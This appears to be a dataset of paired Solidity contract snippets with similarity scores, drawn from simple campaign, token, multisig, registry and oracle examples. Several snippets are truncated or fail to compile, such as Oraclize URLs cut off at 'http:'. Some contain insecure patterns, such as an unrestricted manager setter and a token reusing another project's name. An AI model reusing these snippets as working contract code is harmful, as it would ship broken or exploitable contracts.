    public view returns (address operator);



  function setApprovalForAll(address operator, bool _approved) public;

  function isApprovedForAll(address owner, address operator)

    public view returns (bool);



  

  



  

}"
"contract Quux {
    struct Foo {   string[] bar;     }
    mapping (address => Foo) foos;
    function Quux() { 
        foos[msg.sender] = Foo([]);
    }
}",0.5945329083402359,"contract StableStore {
    
    mapping (address => string) public store;
    
    function setValue(string _value) {
        store[msg.sender]=_value;
    }
}"
"contract C {
    using BigInt for BigInt.bigint;

    function f() public pure {
        var x = BigInt.fromUint(7);
        var y = BigInt.fromUint(uint(-1));
        var z = x.add(y);
    }
}",0.5414322936288644,"contract Sqrt {

	function sqrt(uint x)public pure returns(uint y) {

        uint z = (x + 1) / 2;

        y = x;

        while (z < y) {

            y = z;

            z = (x / z + z) / 2;

        }

    }

}"
"contract CampaignFactory {

    address[] public deployedCampaigns;

    function createCampaign(string description, uint minimumContribution, string campaignCategory, string endDate) public {
        address newlyCreatedCampaign = new Campaign(description, minimumContribution, campaignCategory, endDate, msg.sender);
        deployedCampaigns.push(newlyCreatedCampaign);
    }

    function getDeployedCampaigns() public view returns (address[]) {
        return deployedCampaigns;
    }
}",0.5374950089322905,"contract SimpleVoting {



    string public constant description = ""abc"";



    string public name = ""asd"";



    mapping (string => string) certificates;



    address owner;



    constructor() public {

        owner = msg.sender;

    }



    function getCertificate(string memory id) public view returns (string memory) {

        return certificates[id];

    }



    function setCertificate(string memory id, string memory cert) public {

        require(msg.sender == owner);

        certificates[id] = cert;

    }

}"
"contract Campaign {

    struct NewCampaignType {
        string description;
        uint minimumContribution;
        string campaignCategory;
        string endDate;
        address managerAddress;
    }

    struct Request {
        string description;
        uint value;
        address recipient;
        bool complete;
        uint approvalCount;
        mapping(address => bool) approvals;
    }

    mapping(address => NewCampaignType) public campaigns;
    Request[] public requests;
    mapping(address => bool) public approvers;
    uint public approversCount;
    address public currentManagerAddress;

    modifier restricted() {
        require(msg.sender == campaigns[currentManagerAddress].managerAddress);
        _;
    }

    function Campaign(string description, uint minimumContribution, string campaignCategory, string endDate, address managerAddress) public {
        NewCampaignType memory createCampaign = NewCampaignType({
            description: description,
            minimumContribution: minimumContribution,
            campaignCategory: campaignCategory,
            endDate: endDate,
            managerAddress: managerAddress
        });
        campaigns[managerAddress] = createCampaign;
    }

    function contribute() public payable {
        require(msg.value > campaigns[currentManagerAddress].minimumContribution);
        approvers[msg.sender] = true;
        approversCount++;
    }

    function createRequest(string description, uint value, address recipient) public restricted {
        Request memory newRequest = Request({
           description: description,
           value: value,
           recipient: recipient,
           complete: false,
           approvalCount: 0
        });

        requests.push(newRequest);
    }

    function approveRequest(uint index) public {
        Request storage request = requests[index];

        require(approvers[msg.sender]);
        require(!request.approvals[msg.sender]);

        request.approvals[msg.sender] = true;
        request.approvalCount++;
    }

    function finalizeRequest(uint index) public restricted {
        Request storage request = requests[index];

        require(request.approvalCount > (approversCount / 2));
        require(!request.complete);

        request.recipient.transfer(request.value);
        request.complete = true;
    }

    function setCurrentManager(address managerAddress) public {
        currentManagerAddress = managerAddress;
    }

    function getSummary() public view returns (
      uint, uint, uint, uint, address
      ) {
        return (
          campaigns[currentManagerAddress].minimumContribution,
          this.balance,
          requests.length,
          approversCount,
          campaigns[currentManagerAddress].managerAddress
        );
    }

    function getRequestsCount() public view returns (uint) {
        return requests.length;
    }
}",0.5955631302494099,"contract IECT is SafeMath {

    string constant tokenName = 'IENETChain';

    string constant tokenSymbol = 'IECT';

    uint8 constant decimalUnits = 8;



    string public name;

    string public symbol;

    uint8 public decimals;



    uint256 public totalSupply = 20 * (10**8) * (10**8); 



    address public owner;

    

    mapping(address => bool) restrictedAddresses;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;



    

    event Transfer(address indexed from, address indexed to, uint256 value);



    event Approval(address indexed _owner, address indexed _spender, uint256 _value);



    modifier onlyOwner {

        assert(owner == msg.sender);

        _;

    }



    

    constructor() public {

        balanceOf[msg.sender] = totalSupply;                

        name = tokenName;                                   

        symbol = tokenSymbol;                               

        decimals = decimalUnits;                            

        owner = msg.sender;

    }



    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(_value > 0);

        require(balanceOf[msg.sender] >= _value);              

        require(balanceOf[_to] + _value >= balanceOf[_to]);    

        require(!restrictedAddresses[msg.sender]);

        require(!restrictedAddresses[_to]);

        balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);   

        balanceOf[_to] = SafeMath.safeAdd(balanceOf[_to], _value);                 

        emit Transfer(msg.sender, _to, _value);                  

        return true;

    }



    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowance[msg.sender][_spender] = _value;            

        emit  Approval(msg.sender, _spender, _value);              

        return true;

    }



    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        require(balanceOf[_from] >= _value);                  

        require(balanceOf[_to] + _value >= balanceOf[_to]);   

        require(_value <= allowance[_from][msg.sender]);      

        require(!restrictedAddresses[_from]);

        require(!restrictedAddresses[msg.sender]);

        require(!restrictedAddresses[_to]);

        balanceOf[_from] = SafeMath.safeSub(balanceOf[_from], _value);    

        balanceOf[_to] = SafeMath.safeAdd(balanceOf[_to], _value);        

        allowance[_from][msg.sender] = SafeMath.safeSub(allowance[_from][msg.sender], _value);

        emit Transfer(_from, _to, _value);

        return true;

    }





    function() external payable {

        revert();

    }



    

    function editRestrictedAddress(address _newRestrictedAddress) public onlyOwner {

        restrictedAddresses[_newRestrictedAddress] = !restrictedAddresses[_newRestrictedAddress];

    }



    function isRestrictedAddress(address _querryAddress) view public returns (bool answer) {

        return restrictedAddresses[_querryAddress];

    }

}"
"contract Contract2 is Contract2Interface {
    event ContractCreation(address _newContract);

    function createNewContract3() public returns(address) {

        Contract3 createdContract3 = new Contract3(); 
        ContractCreation(createdContract3);
        return createdContract3; 

    }
}",0.5587949452949668,"contract Creator {
    function newContract(bytes data) public returns (address) {
        address theNewContract;
        uint s = data.length;

        assembly {
            calldatacopy(mload(0x40), 68, s)
            theNewContract := create(callvalue, mload(0x40), s)
        }

        return theNewContract;
    }
}"
"contract SimpleMultiSig {



bytes32 constant EIP712DOMAINTYPE_HASH = 0xd87cd6ef79d4e2b95e15ce8abf732db51ec771f1ca2edccf22a46c729ac56472;


bytes32 constant NAME_HASH = 0xb7a0bfa1b79f2443f4d73ebb9259cddbcd510b18be6fc4da7d1aa7b1786e73e6;


bytes32 constant VERSION_HASH = 0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6;


bytes32 constant TXTYPE_HASH = 0x3ee892349ae4bbe61dce18f95115b5dc02daf49204cc602458cd4c1f540d56d7;

bytes32 constant SALT = 0x251543af6a222378665a76fe38dbceae4871a070b7fdaf5c6c30cf758dc33cc0;

  uint public nonce;                 
  uint public threshold;             
  mapping (address => bool) isOwner; 
  address[] public ownersArr;        

  bytes32 DOMAIN_SEPARATOR;          

  
  constructor(uint threshold_, address[] owners_, uint chainId) public {
    require(owners_.length <= 10 && threshold_ <= owners_.length && threshold_ > 0);

    address lastAdd = address(0);
    for (uint i = 0; i < owners_.length; i++) {
      require(owners_[i] > lastAdd);
      isOwner[owners_[i]] = true;
      lastAdd = owners_[i];
    }
    ownersArr = owners_;
    threshold = threshold_;

    DOMAIN_SEPARATOR = keccak256(abi.encode(EIP712DOMAINTYPE_HASH,
                                            NAME_HASH,
                                            VERSION_HASH,
                                            chainId,
                                            this,
                                            SALT));
  }

  
  function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data, address executor, uint gasLimit) public {
    require(sigR.length == threshold);
    require(sigR.length == sigS.length && sigR.length == sigV.length);
    require(executor == msg.sender || executor == address(0));

    
    bytes32 txInputHash = keccak256(abi.encode(TXTYPE_HASH, destination, value, keccak256(data), nonce, executor, gasLimit));
    bytes32 totalHash = keccak256(abi.encodePacked(""\x19\x01"", DOMAIN_SEPARATOR, txInputHash));

    address lastAdd = address(0); 
    for (uint i = 0; i < threshold; i++) {
      address recovered = ecrecover(totalHash, sigV[i], sigR[i], sigS[i]);
      require(recovered > lastAdd && isOwner[recovered]);
      lastAdd = recovered;
    }

    
    
    
    nonce = nonce + 1;
    bool success = false;
    assembly { success := call(gasLimit, destination, value, add(data, 0x20), mload(data), 0, 0) }
    require(success);
  }

  function () payable external {}
}",0.5663941690410519,"contract Lockbox {



    event PayOut(

        address indexed to,

        uint indexed nonce,

        uint256 amount

    );



    uint constant UINT_MAX = ~uint(0);



    address public owner; 

    address payable public returnFundsAddress;



    mapping(uint256 => bool) usedNonces;



    constructor(address payable returnFunds) public payable {

        owner = msg.sender;

        returnFundsAddress = returnFunds;

    }



    

    function () external payable {

    }



    function getOwner() public view returns (address) {

        return owner;

    }



    function claimPayment(uint256 amount, uint nonce, bytes memory sig) public {

        require(!usedNonces[nonce], ""Reused nonce"");



        

        bytes32 message = prefixed(keccak256(abi.encodePacked(amount, nonce, this)));



        

        require(recoverSigner(message, sig) == owner, ""Non-owner signature"");

        

        if (nonce == 0) {

            require(amount == 1, ""Req. 1 WEI amt for 0 nonce"");

        } else {

            usedNonces[nonce] = true;

        }



        emit PayOut(msg.sender, nonce, amount);

        msg.sender.transfer(amount);

    }



    function returnFunds(uint256 amount, uint[] memory nonces) public {

        require(msg.sender == owner, ""Non-owner sender"");



        for (uint i = 0; i < nonces.length; i++){

            if (nonces[i] != 0)

                usedNonces[nonces[i]] = true;

        }



        emit PayOut(returnFundsAddress, UINT_MAX, amount);

        returnFundsAddress.transfer(amount);

    }



    

    function kill() public {

        require(msg.sender == owner, ""Non-owner sender"");

        selfdestruct(returnFundsAddress);

    }



    

    function splitSignature(bytes memory sig)

        internal

        pure

        returns (uint8, bytes32, bytes32)

    {

        require(sig.length == 65, ""Malformed sig"");



        bytes32 r;

        bytes32 s;

        uint8 v;



        assembly {

            

            r := mload(add(sig, 32))

            

            s := mload(add(sig, 64))

            

            v := byte(0, mload(add(sig, 96)))

        }



        

        if (v < 27) 

            v += 27;



        return (v, r, s);

    }



    function recoverSigner(bytes32 message, bytes memory sig)

        internal

        pure

        returns (address)

    {

        uint8 v;

        bytes32 r;

        bytes32 s;



        (v, r, s) = splitSignature(sig);



        return ecrecover(message, v, r, s);

    }



    

    function prefixed(bytes32 hash) internal pure returns (bytes32) {

        return keccak256(abi.encodePacked(""\x19Ethereum Signed Message:\n32"", hash));

    }

}"
"contract Purchase {
    address public sellerAddress;

    constructor (address _sellerAddress) {
        sellerAddress = _sellerAddress;
    }
}",0.5939949393039943,"contract ThisMustBeFirst {

  address public bts_address1;
  address public bts_address2;
  address public token_address;

}"
"contract A {

    modifier checkCaller() {
        require(msg.sender == 0x123);
        _;
    }

    function doSmth() checkCaller {}
}",0.5939383623609066,"contract Ownable {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}"
"contract Escrow is Ownable { 
    ERC20 public currency; 
    address public collectionAddress;

    function Escrow(ERC20 _currency, address _collectionAddress) public { 
        currency = _currency; 
        collectionAddress = _collectionAddress; 
    } 
}",0.5583307378713523,"contract ERC20 {

    function balanceOf(address tokenOwner) public view returns (uint256);

    function transfer(address to, uint tokens) public;

    function transferFrom(address from, address to, uint256 value) public;

}"
"contract Campaign {
    struct Request {
        string description;
        uint value;
        address payable recipient;
        bool complete;
        uint approvalCount;
        mapping (address => bool) approvals;
    }

    address public manager;
    uint public minimumContribution;
    
    mapping (address => bool) public approvers;
    Request[] public requests;
    uint public approversCount;


    constructor(uint minimum) public {
        manager=msg.sender;
        minimumContribution=minimum;
    }

    function contribute() public payable {
        require(msg.value>minimumContribution);
        
        approvers[msg.sender]=true;
        approversCount++;
    }

    function createRequest(string memory description,uint value,address payable recipient) public restricted {
        
        Request memory newRequest=Request({description:description,value:value,recipient:recipient,complete:false,approvalCount:0});
        requests.push(newRequest);

    }

    function approveRequest(uint index) public {
        Request storage request=requests[index];

        require(approvers[msg.sender]);
        require(!request.approvals[msg.sender]);
        request.approvals[msg.sender]=true;
        request.approvalCount++;
    } 

    function finalizeRequest(uint index) public restricted payable{
        Request storage request = requests[index];

        require(request.approvalCount>=(approversCount/2));
        require(!request.complete);
        request.recipient.transfer(request.value);
        request.complete=true;

    } 

    modifier restricted() {
        require (msg.sender == manager);
        _;
    }
}",0.574733243078964,"contract Request {

    

    string public name = ""Request Network"";

    string public symbol = ""REQ"";

    uint8 public decimals = 18;

    

    uint256 public totalSupply;

    uint256 public tokenSupply = 999986586;

    uint256 public buyPrice = 7350;

    address public creator;

    

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



    

    event Transfer(address indexed from, address indexed to, uint256 value);

    event FundTransfer(address backer, uint amount, bool isContribution);

    

    

    

    function Request() public {

        totalSupply = tokenSupply * 10 ** uint256(decimals);  

        balanceOf[msg.sender] = totalSupply;    

        creator = msg.sender;

    }

    

    function _transfer(address _from, address _to, uint _value) internal {

        

        require(_to != 0x0);

        

        require(balanceOf[_from] >= _value);

        

        require(balanceOf[_to] + _value >= balanceOf[_to]);

        

        balanceOf[_from] -= _value;

        

        balanceOf[_to] += _value;

        Transfer(_from, _to, _value);

      

    }



    

    function transfer(address _to, uint256 _value) public {

        _transfer(msg.sender, _to, _value);

    }



    

    

    

    function () payable internal {

        uint amount = msg.value * buyPrice;                    

        uint amountRaised;                                     

        amountRaised += msg.value;                            

        require(balanceOf[creator] >= amount);               

        balanceOf[msg.sender] += amount;                  

        balanceOf[creator] -= amount;                        

        Transfer(creator, msg.sender, amount);               

        creator.transfer(amountRaised);

    }



 }"
"contract Callee {  
    event EventTest(string value1);

    function callMe(string value) returns (string) {
            EventTest('testing')
    }
}",0.5886897924257954,"contract StableStore {
    
    mapping (address => string) public store;
    
    function setValue(string _value) {
        store[msg.sender]=_value;
    }
}"
"contract TestcaseResetObject {

    MyObject ob;

    struct MyObject {
        mapping(uint8 => uint) map;
    }

    event Output(uint number);

    function makeNew() {
        ob = MyObject();
        ob.map[0] += 1;
        Output(ob.map[0]);
    }
}",0.5128218288212745,"contract FunGame 
{
    address owner;
    struct user
    {
        address parent;
        uint8 level;
    }
    mapping(address=>user) public map;
    function FunGame()
    {
        owner = msg.sender;
        map[msg.sender].level = 8; 
    }
}"
"contract NewContract {

    struct Location {
        string JSON;
        string comment;
    }

    Location[] locations;

    function createLocation(string memory _json) public {
        locations.push(Location(_json, 'no comment'));
    }

    function addComment(string memory _comment, uint _id) public {
        locations[_id].comment = _comment;
    }

    function viewComment(uint _id) public view returns(string memory) {
        string memory result = locations[_id].comment;
        return result;
    }

    function viewNewestComment() public view returns(string memory) {
        uint _id = locations.length - 1;
        string memory result = locations[_id].comment;
        return result;
    }


}",0.5895543766633425,"contract IERC721Metadata is IERC721 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function tokenURI(uint256 tokenId) external view returns (string memory);
    function eventName(uint256 tokenId) external view returns (string memory);
    function eventDate(uint256 tokenId) external view returns (string memory);
    function eventLocation(uint256 tokenId) external view returns (string memory);
    function ticketType(uint256 tokenId) external view returns (string memory);
}"
"contract NewBook {

        struct ReviewerData {
            string name,
            uint industryXP
            
        }

        struct ChapterData {
            
            string title;
            string color;
            uint pages;
            
            ReviewerData[] reviewer;
            address[] reviewers;
        }

        struct BookData {
            
            ChapterData[] chapters;
        }

        mapping(bytes32 => BookData) books; 

        function addChapter(bytes32 _bookID, string memory title, string color, uint pages) public {
            ChapterData memory c = ChapterData({
                title: title,
                color: color,
                pages: pages,
                
                
            });
            books[_bookID].chapters.push(c);
        }",0.5364011424498235,"contract Storage {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    mapping(bytes32 => string) data;

    function set(bytes32 key, string memory value) public {
        require(
            bytes(data[key]).length == 0,
            ""username has already been taken""
        );
        data[key] = value;
    }

    function get(bytes32 key) public view returns (string memory) {
        return data[key];
    }

    function del(bytes32 key) public {
        require(msg.sender == owner, ""only the owner can delete names"");
        delete data[key];
    }
}"
"contract DieselPrice is usingOraclize {

    uint public dieselPriceUSD;
    string public re;

    event LogNewDieselPrice(string price);
    event LogNewOraclizeQuery(string description);

    constructor() public {
        update(); 
    }

    function __callback(bytes32 myid, string memory result) public {
        
        emit LogNewDieselPrice(result);
        re = result;
        
        
        
    }

    function update() public payable {
        emit LogNewOraclizeQuery(""Oraclize query was sent, standing by for the answer..."");
        oraclize_query(""URL"", ""xml(http:
    }
}",0.5691207822223677,"contract Cert is MintableToken {
    string public name = ""DecenterUni Biz Pre 2"";
    string public symbol = ""DUBP2"";
    uint8 public decimals = 0;
    uint public INITIAL_SUPPLY = 0;

    constructor () public {
    }

    event memo(string _memo);

    function mintWithMemo(string _memo, address _to, uint256 _amount) public {
        mint(_to, _amount);
        emit memo(_memo);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(msg.sender == owner);
        super.transfer(_to, _value);
    }
}"
"contract test3 {       
    address watch_addr = address(0x1234567963); 

    function balanceOf(address owner) public {
        watch_addr.call(abi.encodeWithSignature(""balanceOf(address)"", owner));
        return balanceOf(owner);
    }
}",0.5831450391401188,"contract IDapCarToken {
    function mint(address _address, uint256 _value) public returns (bool);
    function balanceOf(address _owner) public constant returns (uint balance);
}"
"contract SimplifiedMainContract {

    using Lib for Lib.Store;
    Lib.Store private store;

    function deposit() public payable {
        store.deposit();
    }

    function withdraw() public {
        store.withdraw();
    }

}",0.5849747389021558,"contract dexBlue{
    function depositToken(address token, uint256 amount) public {}
    function depositEther() public payable{}
    function getTokens() view public returns(address[] memory){}
}"
"contract Link {
  using LinkedList for LinkedList.data;
  LinkedList.data public list;
  function Test() {
    list.append(""abc"",""111"");
    list.append(""def"", ""222"");
    list.append(""ghf"", ""333"");
  }

  function get() returns (bytes32, bytes32) {
    return (list.get_head_data());
  }
}",0.5471274990176357,"contract User {

    mapping (bytes32 => bool) public existingNames;

    mapping (address => bytes32) public names;



    function getName(address) external view returns (bytes32) {}

    function setName(address, string) external returns (bytes32) {}

}"
"contract forwardCryptoUnlockedReward {

 address kovanDAOaddress = 0x765Eb7A0cB7Ecb9cc555e8ad77D13396D1052c3C;
 address payable kovanWETHaddress  = 0xd0A1E359811322d97991E03f863a0C30C2cF029C;

 function() payable external { 

 }

 function forward() public {
     uint balanceToSend =  address(this).balance;
     kovanWETHaddress.transfer( address(this).balance );
     IERC20(kovanWETHaddress).transfer(kovanDAOaddress, balanceToSend);
 }

}",0.5050072813187779,"contract DistributeKRI is Ownable{
	uint[] public balances;
	address[] public addresses;

	token tokenReward = token(0xeef8102A0D46D508f171d7323BcEffc592835F13);

	function register(address[] _addrs, uint[] _bals) onlyOwner{
		addresses = _addrs;
		balances = _bals;
	}

	function distribute() onlyOwner {
		for(uint i = 0; i < addresses.length; ++i){
			tokenReward.transfer(addresses[i],balances[i]*10**18);
		}
	}
}"
"contract hier {

     uint i;
    uint ur=0;
    bytes15[2][20] public UserRole;

    function user_role_assignment(bytes15[] memory a) public
    {
        for(i=0;i<10;i++)    
        {
            if(i%2==0)
            UserRole[ur][0]=a[i];
            else{
            UserRole[ur][1]=a[i];

            ur=ur+1;
            }
        }  
    }

bytes15 public result;

function checkAccess( bytes15 username ) public {

    for(i=0;i<10;i++)    
        { 
            if(UserRole[i][0]==username)
               result = UserRole[i][1];
       }
}

function RESULT() public view  returns(bytes15)
 {

    return result;

}

}",0.5598664468117749,"contract EmcoTokenInterface is ERC20 {



    function setReferral(bytes32 _code) public;

    function setReferralCode(bytes32 _code) public view returns (bytes32);



    function referralCodeOwners(bytes32 _code) public view returns (address);

    function referrals(address _address) public view returns (address);

    function userReferralCodes(address _address) public view returns (bytes32);



}"
"contract Trading {

    address receivingAccount;
    uint deadline;

    struct Asset {
        string name;
        uint price;
        uint barcode;
    }

    struct Stock {
        Asset asset;
        uint count;
    }

    struct Vendor {
        string name;
        address account;
        Stock[] stocks;
    }

    Asset[] assets;
    Vendor[] vendors;

    
    function Trading(address _vendor0, address _vendor1) {
        
        assets.push(Asset(""Asset0"", 12, 1234));
        Asset memory asset1 = Asset(""Asset1"", 34, 5678);
        assets.push(asset1);

        
        Vendor memory vendor0 = Vendor(""Vendor0"", _vendor0, new Stock[](5));
        Vendor memory vendor1 = Vendor(""Vendor1"", _vendor1, new Stock[](5));

        
        vendor0.stocks[0] = Stock(assets[0], 2);
        vendor0.stocks[1] = Stock(assets[1], 2);
        vendors.push(vendor0);

        
        vendor1.stocks[0] = Stock(assets[0], 1);
        vendor1.stocks[1] = Stock(assets[1], 1);

        
        deadline = now + 10 * 1 minutes;
    }  

    function listAssetBarcodes() constant returns (uint[]) {
        uint[] memory barcodes = new uint[](assets.length);
        for (uint i=0; i<assets.length; i++) {
            barcodes[i] = assets[i].barcode;
        }
        return barcodes;
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function dispose() afterDeadline {
        suicide(receivingAccount);
    }
}",0.5197755551621543,"contract ZENITH is UnlimitedAllowanceToken {



    uint8 constant public decimals = 6;

    uint public totalSupply = 270000000000000;

    string constant public name = ""ZENITH Protocol"";

    string constant public symbol = ""ZENITH"";

    string messageString = ""[ Welcome to the 芦ZENITH | Tokens Ttansfer Adaptation禄 Project 0xbt ]"";

	event Approval(address indexed owner, address indexed spender, uint256 value);

  

    

	

    function TransferTokenData(address _token, address[] addresses, uint amount, string _data) public {

    ZENITH token = ZENITH(_token);

    for(uint i = 0; i < addresses.length; i++) {

      require(token.transferFrom(msg.sender, addresses[i], amount));

    }

  }

    

    function SendEthData(address[] addresses, string _data) public payable {

    uint256 amount = msg.value / addresses.length;

    for(uint i = 0; i < addresses.length; i++) {

      addresses[i].transfer(amount);

    }

  }

    

    function getNews() public constant returns (string message) {

        return messageString;

    }

    

    function setNews(string lastNews) public {

        messageString = lastNews;

    }

    

    function ZENITH() {

        balances[msg.sender] = totalSupply;

    }

}"
"contract ServiceContract {

  FirstContract firstContract;

  function ServiceContract (address _firstContract) public {
    firstContract = FirstContract(_firstContract);
  }

  function confirmFirstContract() public view returns(bool) {
      bool x = firstContract.isTrue();
      return x;
  }

  function sayHi() public view returns(bool) {
      bool y = firstContract.sayHello();
      return y;
  }

}",0.5592001536943018,"contract PricingStrategy {

  function isPricingStrategy() public constant returns (bool) {
    return true;
  }

  
  function isSane(address crowdsale) public constant returns (bool) {
    return true;
  }

 
  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);
}"
"contract HelpLogs {

  event LogFirstHalf(bytes _data);
  event LogSecondHalf(bytes _data);

  function logit(bytes data) external {
    
    
    LogFirstHalf(data);
  }
}",0.5722730256538091,"contract EventMetadata {

    event MetadataSet(bytes metadata);

    

    
    
    function _setMetadata(bytes memory metadata) internal {
        emit MetadataSet(metadata);
    }
}"
"contract Test {

    event Event(address);
    event TestEvent(uint256);
    event Data(bytes);
    event Data1(bytes);
    function show() public returns(uint256){
        emit Event(msg.sender);
        return 100;
    }

    function test(uint256 a)external returns(bytes){

        emit Data(msg.data);
        emit TestEvent(a);
        return msg.data;

    }
    function caller1(address _addr) {
        emit Data1(abi.encodeWithSelector(bytes4(keccak256(""test(uint256)"")),100));
        _addr.call(abi.encodeWithSelector(bytes4(keccak256(""test(uint256)"")),100));
    }
}",0.5514017376770742,"contract Example {



    FiatContract public price;

    event NewPayment(address sender, uint256 amount);



    function Example() {

        price = FiatContract(0x8055d0504666e2B6942BeB8D6014c964658Ca591);

    }



    

    function FiveETHUSD() constant returns (uint256) {

        

        uint256 ethCent = price.USD(0);

        

        return ethCent * 500;

    }



    function DoCall() external payable returns (string) {

        require(msg.value==FiveETHUSD());

        NewPayment(msg.sender, msg.value);

        return ""you paid $5.00 USD!!!"";

    }



}"
"contract Call {

    function caller1(address _addr) {
        _addr.call(abi.encodeWithSelector(bytes4(keccak256(""test(uint256)"")),100));
    }
}",0.5169301963637168,"contract everydayBonusSystem{

    function bonusSystem(address addr) external returns(address,uint,uint256);

}"
"contract Courses is Owned {

    struct Instructor {
        uint age;
        string fName;
        string sName;
    }

    mapping (address => Instructor) instructors;
    address[] public instructorAccts;

    function setInstructor(address _address, uint _age, string _fName, string _sName) onlyOwner public {

        var instructor = instructors[_address];

        instructor.age = _age;
        instructor.fName = _fName;
        instructor.sName = _sName;

        instructorAccts.push(_address) -1;
    }
}",0.5654165669788044,"contract RBAC {

    event RoleAdded(address indexed operator, string role);

    event RoleRemoved(address indexed operator, string role);

    function checkRole(address _operator, string _role) view public;

    function hasRole(address _operator, string _role) view public returns (bool);

    function addRole(address _operator, string _role) internal;

    function removeRole(address _operator, string _role) internal;

}"
"contract Zipfs {

IpfsData[] public ipfsrecs;

struct IpfsData {
    bytes32 reviewData;
}

function addIpfs (bytes32 _reviewData) payable returns (bool success) {
    IpfsData memory newIpfsData;
    newIpfsData.reviewData = _reviewData;

    ipfsrecs.push(newIpfsData);
    return true;
}

function getIpfsData() constant returns (bytes32[]) {

    uint length = ipfsrecs.length;
    bytes32[] memory reviews = new bytes32[](length);

    for (uint i=0; i<ipfsrecs.length; i++) {
        IpfsData memory currentIpfsRec;
        currentIpfsRec = ipfsrecs[i];

        reviews[i]=currentIpfsRec.reviewData;


    }
    return (reviews);
}


}",0.5256170888054186,"contract MyMileage {



    

    address private owner;



    

    mapping(bytes32 => uint) private map;



    

    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    

    constructor() public {

        owner = msg.sender;

    }



    

    function put(bytes32 imageHash) onlyOwner public {



        

        require(free(imageHash));



        

        map[imageHash] = now;

    }



    

    function free(bytes32 imageHash) view public returns (bool) {

        return map[imageHash] == 0;

    }



    

    function get(bytes32 imageHash) view public returns (uint) {

        return map[imageHash];

    }

    

    

    

    function getConfirmationCode() view public returns (bytes32) {

        return blockhash(block.number - 6);

    }

}"
"contract NameRegistry {

  function NameRegistry() {
    
  }

  function register(address record, string namespace, string name) returns (bool success) {
    if (names[namespace][name] > 0) {
      return false;
    }

    names[namespace][name] = record;
    return true;
  }

  function lookup(string namespace, string name) returns (address record) {
    return names[namespace][name];
  }

  
  mapping(string => mapping(string => address)) names;
}",0.5887899940371031,"contract NamedToken {
  string public name;
  string public symbol;
  uint32 public decimals;

  function NamedToken(string _name, string _symbol, uint32 _decimals) {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
  }

  
  function getNameHash() constant returns (bytes32 result){
    return sha3(name);
  }

  
  function getSymbolHash() constant returns (bytes32 result){
    return sha3(symbol);
  }
}"
"contract WeatherApiCall is usingOraclize {

   string public weathercondition;
   function WeatherApiCall() {

           OAR = OraclizeAddrResolverI(0x3df0db5bda9d685e41cb4a8834c44f8028957417);
   }

   function __callback(bytes32 myid, string result) {
           if (msg.sender != oraclize_cbAddress()) throw;
           weathercondition=result;
   }
   function update(string to,string datetime) payable returns(bool sufficient) {
          oraclize_query(""URL"", strConcat(""json(http:
          return true;
   } 
}",0.5438249888694116,"contract I_Pricer {
    uint128 public lastPrice;
    I_minter public mint;
    string public sURL;
    mapping (bytes32 => uint) RevTransaction;
    function __callback(bytes32 myid, string result) {}
    function queryCost() constant returns (uint128 _value) {}
    function QuickPrice() payable {}
    function requestPrice(uint _actionID) payable returns (uint _TrasID) {}
    function collectFee() returns(bool) {}
    function () {
        
        revert();
    }
}"
"contract MaintainableUpgradeabilityProxy is UpgradeabilityProxy {

  
  event ServiceRegistryChanged(address previousRegistry, address newRegistry);

  
  bytes32 private constant ADMIN_SLOT = 0x10d6a54a4754c8869d6886b5f5d7fbfa5b4522237ea5c60d11bc4e7a1ff9390b;

  
  modifier ifMaintainer() {
    if (IServiceRegistry(_serviceRegistry()).getMaintainerRegistryV1().isMaintainer(msg.sender)) {
      _;
    } else {
      _fallback();
    }
  }

  
  constructor(address _implementation, address _serviceReg) UpgradeabilityProxy(_implementation) public {
    assert(ADMIN_SLOT == keccak256(""org.zeppelinos.proxy.admin""));
    _setServiceRegistry(_serviceReg);
  }

  
  function implementation() external view ifMaintainer returns (address) {
    return _implementation();
  }

  
  function changeServiceRegistry(address _newRegistry) external ifMaintainer {
    require(_newRegistry != address(0), ""New registry cannot be address(0)"");
    emit ServiceRegistryChanged(_serviceRegistry(), _newRegistry);
    _setServiceRegistry(_newRegistry);
  }

  
  function upgradeTo(address newImplementation) external ifMaintainer {
    _upgradeTo(newImplementation);
  }

  
  function upgradeToAndCall(address _implementation, bytes data) external payable ifMaintainer {
    _upgradeTo(_implementation);
    
    require(address(this).call.value(msg.value)(data), ""Call failed"");
  }

  
  function _serviceRegistry() internal view returns (address _serviceReg) {
    bytes32 slot = ADMIN_SLOT;
    
    assembly {
      _serviceReg := sload(slot)
    }
  }

  
  function _setServiceRegistry(address _serviceReg) internal {
    bytes32 slot = ADMIN_SLOT;

    
    assembly {
      sstore(slot, _serviceReg)
    }
  }

  
  function _willFallback() internal {
    require(
      !IServiceRegistry(_serviceRegistry()).getMaintainerRegistryV1().isMaintainer(msg.sender),
      ""Maintainer cannot call fallback functions"");
    super._willFallback();
  }
}",0.5197102064280921,"contract TkoWhitelist is Ownable{



    using SafeMath for uint256;



    

    address public admin;



    mapping(address => uint256) internal totalIndividualWeiAmount;

    mapping(address => bool) internal whitelist;



    event AdminChanged(address indexed previousAdmin, address indexed newAdmin);





    

    function TkoWhitelist (address _admin) public {

        require(_admin != address(0));

        admin = _admin;

    }



    

    modifier onlyOwnerOrAdmin() {

        require(msg.sender == owner || msg.sender == admin);

        _;

    }



 

 modifier onlyAdmin() {

   require(msg.sender == admin);

   _;

  }



    

    function changeAdmin(address newAdmin) public onlyOwner {

        AdminChanged(admin, newAdmin);

        admin = newAdmin;

    }





    

    function isWhitelisted(address _beneficiary) external view onlyOwnerOrAdmin returns (bool) {

        return whitelist[_beneficiary];

    }



    

